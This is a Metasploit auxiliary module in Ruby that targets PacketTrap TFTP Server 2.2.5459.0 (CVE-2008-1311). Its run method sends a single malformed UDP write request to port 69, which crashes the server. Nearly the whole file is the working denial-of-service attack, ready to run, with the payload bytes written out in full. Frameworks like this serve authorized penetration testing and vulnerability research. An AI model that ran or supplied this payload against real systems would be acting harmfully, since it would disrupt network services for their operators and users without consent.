##
# $Id: pt360_write.rb 9653 2010-07-01 23:33:07Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Udp
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'PacketTrap TFTP Server 2.2.5459.0 DoS',
			'Description'    => %q{
				The PacketTrap TFTP server version 2.2.5459.0 can be
				brought down by sending a special write request.
			},
			'Author'         => 'kris katterjohn',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9653 $',
			'References'     =>
				[
					[ 'CVE', '2008-1311'],
					[ 'OSVDB', '42932'],
					[ 'URL', 'http://milw0rm.com/exploits/6863']
				],
			'DisclosureDate' => 'Oct 29 2008'))

		register_options([Opt::RPORT(69)])
	end

	def run
		connect_udp
		print_status("Sending write request...")
		udp_sock.put("\x00\x02|\x00netascii\x00")
		disconnect_udp
	end
end

